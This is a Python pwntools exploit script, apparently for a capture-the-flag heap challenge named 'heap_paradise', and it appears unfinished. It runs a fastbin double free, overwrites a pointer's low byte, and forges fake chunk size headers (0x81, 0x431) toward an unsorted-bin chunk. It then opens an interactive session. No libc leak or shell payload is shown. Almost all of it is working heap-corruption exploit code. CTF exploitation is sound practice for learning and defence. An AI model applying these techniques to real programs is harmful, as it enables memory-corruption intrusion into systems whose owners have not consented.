#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('heap_paradise_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()


def add(size, data):
    sa(b'You Choice:', b'1')
    sna(b'Size :', size)
    sa(b'Data :', data)

def delete(idx):
    sa(b'You Choice:', b'2')
    sna(b'Index :', idx)

load = flat(
    b'\0'*0x68,
    p64(0x81)
)

add(0x78, load)
add(0x78, b'2')
add(0x78, b'3')

delete(0)
delete(1)
delete(0)

add(0x78, p8(0x70))
add(0x78, b'pad1')
add(0x78, load)

add(0x78, p64(0) + p64(0x431)) 

delete(5)
# for i in range(12):
    # add(0x78, b'pad' + p8(i))


p.interactive()
